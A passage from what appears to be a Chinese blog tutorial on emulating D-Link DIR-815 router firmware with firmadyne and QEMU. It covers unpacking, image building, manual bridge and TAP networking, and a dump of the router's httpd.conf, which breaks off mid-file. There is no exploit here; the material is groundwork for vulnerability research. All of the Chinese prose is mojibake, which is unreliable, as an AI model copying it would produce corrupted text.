<p>ä¸‹è½½ DIR-815 å›ºä»¶ï¼Œæ”¾åœ¨ firmadyne ç›®å½•ä¸‹ï¼Œå…ˆå¯¹å›ºä»¶è§£åŒ…</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 ./sources/extractor/extractor.py -np -nk ./DIR815A1_FW104b03.bin</span><br><span class="line"></span><br><span class="line">è¾“å‡ºä¿¡æ¯</span><br><span class="line"></span><br><span class="line">/home/iot/Tools/firmadyne/DIR815A1_FW104b03.bin</span><br><span class="line">&gt;&gt; MD5: 34b013a393503d9b9d0734ecd2ee28dd</span><br><span class="line">&gt;&gt; Tag: DIR815A1_FW104b03.bin_34b013a393503d9b9d0734ecd2ee28dd</span><br><span class="line">&gt;&gt; Temp: /tmp/tmpc9h97s71</span><br><span class="line">&gt;&gt; Status: Kernel: True, Rootfs: False, Do_Kernel: False,                 Do_Rootfs: True</span><br><span class="line">&gt;&gt; Recursing into archive ...</span><br><span class="line">&gt;&gt;&gt;&gt; Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2680303 bytes, 1515 inodes, blocksize: 524288 bytes, created: 2013-05-15 10:04:17</span><br><span class="line">&gt;&gt;&gt;&gt; Found Linux filesystem in /tmp/tmpc9h97s71/_DIR815A1_FW104b03.bin.extracted/squashfs-root!</span><br><span class="line">&gt;&gt; Skipping: completed!</span><br><span class="line">&gt;&gt; Cleaning up /tmp/tmpc9h97s71...</span><br></pre></td></tr></table></figure></div>

<p>è§£åŒ…ååœ¨ images ç›®å½•ä¸‹èƒ½å¤Ÿçœ‹åˆ°ä¸€ä¸ªå‹ç¼©åŒ…æ–‡ä»¶ï¼Œæˆ‘ä»¬æŠŠå®ƒçš„åå­—ä¿®æ”¹ä¸º 1.tar.gz</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mv ./images/DIR815A1_FW104b03.bin_34b013a393503d9b9d0734ecd2ee28dd.tar.gz ./images/1.tar.gz</span><br></pre></td></tr></table></figure></div>

<p>è·å–å›ºä»¶æ¶æ„</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scripts/getArch.sh ./images/1.tar.gz</span><br><span class="line"></span><br><span class="line">è¾“å‡ºä¿¡æ¯</span><br><span class="line"></span><br><span class="line">./bin/busybox: mipsel</span><br></pre></td></tr></table></figure></div>

<p>æ„å»ºé•œåƒ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./scripts/makeImage.sh 1 mipsel</span><br><span class="line"></span><br><span class="line">è¾“å‡ºä¿¡æ¯</span><br><span class="line"></span><br><span class="line">----Running----</span><br><span class="line">----Creating working directory /home/iot/Tools/firmadyne//scratch//1/----</span><br><span class="line">----The size of root filesystem &#x27;/home/iot/Tools/firmadyne//images//1.tar.gz&#x27; is 14008320-----</span><br><span class="line">----Creating QEMU Image /home/iot/Tools/firmadyne//scratch//1//image.raw with size 33554432----</span><br><span class="line">Formatting &#x27;/home/iot/Tools/firmadyne//scratch//1//image.raw&#x27;, fmt=raw size=33554432</span><br><span class="line">----Creating Partition Table----</span><br><span class="line"></span><br><span class="line">æ¬¢è¿ä½¿ç”¨ fdisk (util-linux 2.34)ã€‚</span><br><span class="line">æ›´æ”¹å°†åœç•™åœ¨å†…å­˜ä¸­ï¼Œç›´åˆ°æ‚¨å†³å®šå°†æ›´æ”¹å†™å…¥ç£ç›˜ã€‚</span><br><span class="line">ä½¿ç”¨å†™å…¥å‘½ä»¤å‰è¯·ä¸‰æ€ã€‚</span><br><span class="line"></span><br><span class="line">è®¾å¤‡ä¸åŒ…å«å¯è¯†åˆ«çš„åˆ†åŒºè¡¨ã€‚</span><br><span class="line">åˆ›å»ºäº†ä¸€ä¸ªç£ç›˜æ ‡è¯†ç¬¦ä¸º 0x75dcd7ac çš„æ–° DOS ç£ç›˜æ ‡ç­¾ã€‚</span><br><span class="line"></span><br><span class="line">å‘½ä»¤(è¾“å…¥ m è·å–å¸®åŠ©)ï¼š åˆ›å»ºäº†ä¸€ä¸ªç£ç›˜æ ‡è¯†ç¬¦ä¸º 0xd763342d çš„æ–° DOS ç£ç›˜æ ‡ç­¾ã€‚</span><br><span class="line"></span><br><span class="line">å‘½ä»¤(è¾“å…¥ m è·å–å¸®åŠ©)ï¼š åˆ†åŒºç±»å‹</span><br><span class="line">   p   ä¸»åˆ†åŒº (0ä¸ªä¸»åˆ†åŒºï¼Œ0ä¸ªæ‰©å±•åˆ†åŒºï¼Œ4ç©ºé—²)</span><br><span class="line">   e   æ‰©å±•åˆ†åŒº (é€»è¾‘åˆ†åŒºå®¹å™¨)</span><br><span class="line">é€‰æ‹© (é»˜è®¤ p)ï¼š åˆ†åŒºå· (1-4, é»˜è®¤  1): ç¬¬ä¸€ä¸ªæ‰‡åŒº (2048-65535, é»˜è®¤ 2048): Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (2048-65535, é»˜è®¤ 65535): </span><br><span class="line">åˆ›å»ºäº†ä¸€ä¸ªæ–°åˆ†åŒº 1ï¼Œç±»å‹ä¸ºâ€œLinuxâ€ï¼Œå¤§å°ä¸º 31 MiBã€‚</span><br><span class="line"></span><br><span class="line">å‘½ä»¤(è¾“å…¥ m è·å–å¸®åŠ©)ï¼š åˆ†åŒºè¡¨å·²è°ƒæ•´ã€‚</span><br><span class="line">æ­£åœ¨åŒæ­¥ç£ç›˜ã€‚</span><br><span class="line"></span><br><span class="line">----Mounting QEMU Image----</span><br><span class="line">----Device mapper created at /dev/mapper/loop12p1----</span><br><span class="line">----Creating Filesystem----</span><br><span class="line">mke2fs 1.45.5 (07-Jan-2020)</span><br><span class="line">ä¸¢å¼ƒè®¾å¤‡å—ï¼š å®Œæˆ                            </span><br><span class="line">åˆ›å»ºå«æœ‰ 7936 ä¸ªå—ï¼ˆæ¯å— 4kï¼‰å’Œ 7936 ä¸ªinodeçš„æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line"></span><br><span class="line">æ­£åœ¨åˆ†é…ç»„è¡¨ï¼š å®Œæˆ                            </span><br><span class="line">æ­£åœ¨å†™å…¥inodeè¡¨ï¼š å®Œæˆ                            </span><br><span class="line">å†™å…¥è¶…çº§å—å’Œæ–‡ä»¶ç³»ç»Ÿè´¦æˆ·ç»Ÿè®¡ä¿¡æ¯ï¼š å·²å®Œæˆ</span><br><span class="line"></span><br><span class="line">----Making QEMU Image Mountpoint at /home/iot/Tools/firmadyne//scratch//1//image/----</span><br><span class="line">----Mounting QEMU Image Partition 1----</span><br><span class="line">----Extracting Filesystem Tarball to Mountpoint----</span><br><span class="line">----Creating FIRMADYNE Directories----</span><br><span class="line">----Patching Filesystem (chroot)----</span><br><span class="line">Creating /etc/TZ!</span><br><span class="line">Creating /etc/hosts!</span><br><span class="line">Creating /etc/passwd!</span><br><span class="line">Warning: Recreating device nodes!</span><br><span class="line">----Setting up FIRMADYNE----</span><br><span class="line">----Unmounting QEMU Image----</span><br><span class="line">----Deleting device mapper----</span><br><span class="line">loop deleted : /dev/loop12</span><br></pre></td></tr></table></figure></div>

<p>æ­¤æ—¶åœ¨ scratch&#x2F;1&#x2F; ç›®å½•ä¸‹å¯ä»¥æ‰¾åˆ°æ„å»ºå¥½çš„ image.raw é•œåƒã€‚</p>
<p>æ¨¡æ‹Ÿç½‘ç»œç¯å¢ƒ</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scripts/inferNetwork.sh 1 mipsel</span><br><span class="line"></span><br><span class="line">è¾“å‡ºä¿¡æ¯</span><br><span class="line"></span><br><span class="line">Running firmware 1: terminating after 60 secs...</span><br><span class="line">qemu-system-mipsel: terminating on signal 2 from pid 30275 (timeout)</span><br><span class="line">Inferring network...</span><br><span class="line">Interfaces: [(&#x27;br0&#x27;, &#x27;192.168.0.1&#x27;)]</span><br><span class="line">Done!</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ° firmadyne è·å–åˆ°é•œåƒçš„ç½‘å¡ br0 çš„ ip åœ°å€ä¸º 192.168.0.1ï¼Œå¹¶ä¸”åœ¨ .&#x2F;scratch&#x2F;1&#x2F; ç›®å½•ä¸‹ç”Ÿæˆäº† run.sh å¯åŠ¨è„šæœ¬ï¼Œæˆ‘ä»¬æ‰§è¡Œè¿™ä¸ªè„šæœ¬çœ‹çœ‹èƒ½å¦è®¿é—®åˆ°å›ºä»¶çš„ web ç•Œé¢ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./scratch/1/run.sh</span><br></pre></td></tr></table></figure></div>

<p>å¯åŠ¨åè¿›å…¥ shellï¼Œçœ‹ä¸€ä¸‹ç½‘å¡ä¿¡æ¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">br0       Link encap:Ethernet  HWaddr 00:DE:FA:1A:01:00  </span><br><span class="line">          inet addr:192.168.0.1  Bcast:192.168.0.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::2de:faff:fe1a:100/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:46 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:10386 (10.1 KiB)</span><br><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  </span><br><span class="line">          BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">eth1      Link encap:Ethernet  HWaddr 52:54:00:12:34:57  </span><br><span class="line">          BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">eth2      Link encap:Ethernet  HWaddr 00:DE:FA:1A:01:00  </span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:33 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:200 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:9348 (9.1 KiB)</span><br><span class="line"></span><br><span class="line">eth3      Link encap:Ethernet  HWaddr 00:DE:FA:3A:01:00  </span><br><span class="line">          BROADCAST MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:200 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line">       </span><br><span class="line">ip6tnl0   Link encap:UNSPEC  HWaddr 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  </span><br><span class="line">          NOARP  MTU:1452  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">sit0      Link encap:IPv6-in-IPv4  </span><br><span class="line">          NOARP  MTU:1480  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">tunl0     Link encap:UNSPEC  HWaddr 00-00-00-00-B5-7F-00-00-00-00-00-00-00-00-00-00  </span><br><span class="line">          NOARP  MTU:1480  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure></div>

<p>åªæœ‰ br0ã€eth2ã€lo ä¸‰ä¸ªç½‘å¡è¢«å¯ç”¨ï¼Œä¸”åªæœ‰ br0 æ‹¥æœ‰ IP åœ°å€ï¼Œæ­¤æ—¶å®¿ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´ç½‘ç»œæ˜¯ä¸é€šçš„ã€‚</p>
<p>(ctrl-a x é€€å‡ºè™šæ‹Ÿæœº)</p>
<h1 id="é…ç½®ç½‘ç»œ"><a href="#é…ç½®ç½‘ç»œ" class="headerlink" title="é…ç½®ç½‘ç»œ"></a>é…ç½®ç½‘ç»œ</h1><p>æ—¢ç„¶è‡ªåŠ¨é…ç½®çš„ç½‘ç»œæ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œæˆ‘ä»¬å°è¯•æ‰‹åŠ¨é…ç½®ã€‚(<a href="https://wzt.ac.cn/2021/05/28/QEMU-networking/">å‚è€ƒ</a>)</p>
<p>åˆ›å»ºç½‘æ¡¥</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig &lt;ä½ çš„ç½‘å¡åç§°(èƒ½ä¸Šç½‘çš„é‚£å¼ )&gt; down    # é¦–å…ˆå…³é—­å®¿ä¸»æœºç½‘å¡æ¥å£</span><br><span class="line">brctl addbr br0                     # æ·»åŠ åä¸º br0 çš„ç½‘æ¡¥</span><br><span class="line">brctl addif br0 &lt;ä½ çš„ç½‘å¡åç§°&gt;        # åœ¨ br0 ä¸­æ·»åŠ ä¸€ä¸ªæ¥å£</span><br><span class="line">brctl stp br0 off                   # å¦‚æœåªæœ‰ä¸€ä¸ªç½‘æ¡¥ï¼Œåˆ™å…³é—­ç”Ÿæˆæ ‘åè®®</span><br><span class="line">brctl setfd br0 1                   # è®¾ç½® br0 çš„è½¬å‘å»¶è¿Ÿ</span><br><span class="line">brctl sethello br0 1                # è®¾ç½® br0 çš„ hello æ—¶é—´</span><br><span class="line">ifconfig br0 0.0.0.0 promisc up     # å¯ç”¨ br0 æ¥å£</span><br><span class="line">ifconfig &lt;ä½ çš„ç½‘å¡åç§°&gt; 0.0.0.0 promisc up    # å¯ç”¨ç½‘å¡æ¥å£</span><br><span class="line">dhclient br0                        # ä» dhcp æœåŠ¡å™¨è·å¾— br0 çš„ IP åœ°å€</span><br><span class="line">brctl show br0                      # æŸ¥çœ‹è™šæ‹Ÿç½‘æ¡¥åˆ—è¡¨</span><br><span class="line">brctl showstp br0                   # æŸ¥çœ‹ br0 çš„å„æ¥å£ä¿¡æ¯</span><br></pre></td></tr></table></figure></div>

<p>åˆ›å»º TAP è™šæ‹Ÿç½‘å¡</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tunctl -t tap0 -u root              # åˆ›å»ºä¸€ä¸ª tap0 æ¥å£ï¼Œåªå…è®¸ root ç”¨æˆ·è®¿é—®</span><br><span class="line">brctl addif br0 tap0                # åœ¨è™šæ‹Ÿç½‘æ¡¥ä¸­å¢åŠ ä¸€ä¸ª tap0 æ¥å£</span><br><span class="line">ifconfig tap0 0.0.0.0 promisc up    # å¯ç”¨ tap0 æ¥å£</span><br><span class="line">brctl showstp br0                   # æ˜¾ç¤º br0 çš„å„ä¸ªæ¥å£</span><br></pre></td></tr></table></figure></div>

<p>é…ç½®æ— è¯¯çš„è¯ç½‘æ¡¥ä¿¡æ¯åº”è¯¥å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">br0</span><br><span class="line"> bridge id		8000.000c29e5d458</span><br><span class="line"> designated root	8000.000c29e5d458</span><br><span class="line"> root port		   0			path cost		   0</span><br><span class="line"> max age		  20.00			bridge max age		  20.00</span><br><span class="line"> hello time		   1.00			bridge hello time	   1.00</span><br><span class="line"> forward delay		   1.00			bridge forward delay	   1.00</span><br><span class="line"> ageing time		 300.00</span><br><span class="line"> hello timer		   0.00			tcn timer		   0.00</span><br><span class="line"> topology change timer	   0.00			gc timer		 151.22</span><br><span class="line"> flags			</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ens33 (1)</span><br><span class="line"> port id		8001			state		     forwarding</span><br><span class="line"> designated root	8000.000c29e5d458	path cost		   4</span><br><span class="line"> designated bridge	8000.000c29e5d458	message age timer	   0.00</span><br><span class="line"> designated port	8001			forward delay timer	   0.00</span><br><span class="line"> designated cost	   0			hold timer		   0.00</span><br><span class="line"> flags			</span><br><span class="line"></span><br><span class="line">tap0 (2)</span><br><span class="line"> port id		8002			state		       disabled</span><br><span class="line"> designated root	8000.000c29e5d458	path cost		 100</span><br><span class="line"> designated bridge	8000.000c29e5d458	message age timer	   0.00</span><br><span class="line"> designated port	8002			forward delay timer	   0.00</span><br><span class="line"> designated cost	   0			hold timer		   0.00</span><br><span class="line"> flags			</span><br></pre></td></tr></table></figure></div>

<h1 id="å¯åŠ¨å‘½ä»¤"><a href="#å¯åŠ¨å‘½ä»¤" class="headerlink" title="å¯åŠ¨å‘½ä»¤"></a>å¯åŠ¨å‘½ä»¤</h1><p>å°†å¯åŠ¨å‘½ä»¤ä¸­ç½‘å¡éƒ¨åˆ†æ›¿æ¢ä¸ºæˆ‘ä»¬è‡ªå·±é…ç½®çš„ä¿¡æ¯ï¼Œå¾—åˆ°æ–°çš„å¯åŠ¨å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-system-mipsel -m 256 -M malta -kernel /home/iot/Tools/firmadyne/binaries/vmlinux.mipsel -drive if=ide,format=raw,file=/home/iot/Tools/firmadyne/scratch/1/image.raw -append &quot;root=/dev/sda1 console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure></div>

<p>è™šæ‹Ÿæœºå¯åŠ¨ååœ¨å®¿ä¸»æœºæŸ¥çœ‹ br0 ä¿¡æ¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tap0 (2)</span><br><span class="line"> port id		8002			state		     forwarding</span><br><span class="line"> designated root	8000.000c29e5d458	path cost		 100</span><br><span class="line"> designated bridge	8000.000c29e5d458	message age timer	   0.00</span><br><span class="line"> designated port	8002			forward delay timer	   0.00</span><br><span class="line"> designated cost	   0			hold timer		   0.00</span><br><span class="line"> flags			</span><br></pre></td></tr></table></figure></div>

<p>å…¶ä¸­ tap0 çš„çŠ¶æ€åº”è¯¥ç”± disabled å˜æˆ forwardingã€‚</p>
<p>åœ¨è™šæ‹Ÿæœºä¸­ ping å®¿ä¸»æœºï¼Œå‘ç°è¿˜æ˜¯æ— æ³•è¿é€šï¼Œå°è¯•å¯ç”¨ eth0 ç½‘å¡ï¼Œå¹¶èµ‹äºˆå’Œå®¿ä¸»æœº br0 ç›¸åŒç½‘æ®µçš„ IP</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 up</span><br><span class="line">ifconfig eth0 192.168.37.150 netmask 255.255.255.0</span><br><span class="line"></span><br><span class="line">é…ç½®åè™šæ‹Ÿæœº eth0 ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 52:54:00:12:34:56  </span><br><span class="line">          inet addr:192.168.37.150  Bcast:192.168.37.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::5054:ff:fe12:3456/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:11 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:4 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:3355 (3.2 KiB)  TX bytes:408 (408.0 B)</span><br><span class="line">          Interrupt:10 Base address:0x1020 </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>é…ç½®å¥½ä¹‹å ping å®¿ä¸»æœº</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping 192.168.37.145</span><br><span class="line"></span><br><span class="line">è¾“å‡ºä¿¡æ¯</span><br><span class="line"></span><br><span class="line">ping 192.168.37.145</span><br><span class="line">192.168.37.145 is alive!</span><br></pre></td></tr></table></figure></div>

<p>è‡³æ­¤æˆ‘ä»¬æˆåŠŸè§£å†³äº†ç½‘ç»œäº’é€šé—®é¢˜ï¼Œä½†æ˜¯åœ¨å®¿ä¸»æœºå°è¯•è®¿é—® web æœåŠ¡æ—¶ï¼Œå‘ç°è¿˜æ˜¯æ— æ³•è¿æ¥ã€‚</p>
<h1 id="é…ç½®åˆ†æ"><a href="#é…ç½®åˆ†æ" class="headerlink" title="é…ç½®åˆ†æ"></a>é…ç½®åˆ†æ</h1><p>é¦–å…ˆæŸ¥çœ‹é»˜è®¤ç¯å¢ƒä¸‹è™šæ‹Ÿæœºå¼€æ”¾çš„ç«¯å£</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -tnlp</span><br><span class="line"></span><br><span class="line">è¾“å‡ºä¿¡æ¯</span><br><span class="line"></span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 192.168.0.1:49152       0.0.0.0:*               LISTEN      2105/httpd</span><br><span class="line">tcp        0      0 192.168.0.1:80          0.0.0.0:*               LISTEN      2105/httpd</span><br><span class="line">tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      2118/dnsmasq</span><br><span class="line">tcp        0      0 0.0.0.0:63481           0.0.0.0:*               LISTEN      224/fakedns</span><br><span class="line">tcp        0      0 :::53                   :::*                    LISTEN      2118/dnsmasq</span><br><span class="line">tcp        0      0 :::63481                :::*                    LISTEN      224/fakedns</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ° httpd æœåŠ¡é»˜è®¤ç›‘å¬åœ°å€ 192.168.0.1:80ï¼Œç„¶è€Œ 192.168.0.1 ç½‘æ®µæ— æ³•è®¿é—®ï¼Œæ‰€ä»¥è®¿é—® web æœåŠ¡å¤±è´¥ã€‚</p>
<p>ps çœ‹çœ‹ httpd æœåŠ¡çš„å¯åŠ¨å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps | grep 2105</span><br><span class="line"></span><br><span class="line">è¾“å‡ºä¿¡æ¯</span><br><span class="line"></span><br><span class="line">2105 root      1564 S    httpd -f /var/run/httpd.conf</span><br></pre></td></tr></table></figure></div>

<p>å‘ç° httpd å…·æœ‰ä¸€ä¸ª httpd.conf çš„é…ç½®æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">#LogGMT On</span><br><span class="line">#ErrorLog /dev/console</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">	NumConnections 15</span><br><span class="line">	BufSize 12288</span><br><span class="line">	InputBufSize 4096</span><br><span class="line">	ScriptBufSize 4096</span><br><span class="line">	NumHeaders 100</span><br><span class="line">	Timeout 60</span><br><span class="line">	ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">	Types</span><br><span class="line">	&#123;</span><br><span class="line">		text/html	&#123; html htm &#125;</span><br><span class="line">		text/xml	&#123; xml &#125;</span><br><span class="line">		text/plain	&#123; txt &#125;</span><br><span class="line">		image/gif	&#123; gif &#125;</span><br><span class="line">		image/jpeg	&#123; jpg &#125;</span><br><span class="line">		text/css	&#123; css &#125;</span><br><span class="line">		application/octet-stream &#123; * &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Specials</span><br><span class="line">	&#123;</span><br><span class="line">		Dump		&#123; /dump &#125;</span><br><span class="line">		CGI			&#123; cgi &#125;</span><br><span class="line">		Imagemap	&#123; map &#125;</span><br><span class="line">		Redirect	&#123; url &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	External</span><br><span class="line">	&#123;</span><br><span class="line">		/usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, HTTP/1.1, DIR-815 Ver 1.04&quot;</span><br><span class="line">	ServerId &quot;LAN-1&quot;</span><br><span class="line">	Family inet</span><br><span class="line">	Interface br0</span><br><span class="line">	Address 192.168.0.1</span><br><span class="line">	Port 80</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /</span><br><span class="line">			Location /htdocs/web</span><br><span class="line">			IndexNames &#123; index.php &#125;</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/usr/sbin/phpcgi &#123; txt &#125;</span><br><span class="line">			&#125;</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">				/usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">           Alias /smart404</span><br><span class="line">           Location /htdocs/smart404</span><br><span class="line">        &#125;</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /HNAP1</span><br><span class="line">			Location /htdocs/HNAP1</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">			&#125;</span><br><span class="line">			IndexNames &#123; index.hnap &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, HTTP/1.1, DIR-815 Ver 1.04&quot;</span><br><span class="line">	ServerId &quot;LAN-1&quot;</span><br><span class="line">	Family inet</span><br><span class="line">	Interface br0</span><br><span class="line">	Port 1900</span><br><span class="line">	Address 239.255.255.250</span><br><span class="line">	Datagrams On</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /</span><br><span class="line">			Location /htdocs/upnp/docs/LAN-1</span><br><span class="line">			External</span><br><span class="line">			&#123;</span><br><span class="line">				/htdocs/upnp/ssdpcgi &#123; * &#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">	ServerName &quot;Linux, UPnP/1.0, DIR-815 Ver 1.04&quot;</span><br><span class="line">	ServerId &quot;LAN-1&quot;</span><br><span class="line">	Family inet</span><br><span class="line">	Interface br0</span><br><span class="line">	Address 192.168.0.1</span><br><span class="line">	Port 49152</span><br><span class="line">	Virtual</span><br><span class="line">	&#123;</span><br><span class="line">		AnyHost</span><br><span class="line">		Control</span><br><span class="line">		&#123;</span><br><span class="line">			Alias /</span><br><span class="line">			Location /htdocs/upnp/docs/LAN-1</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span 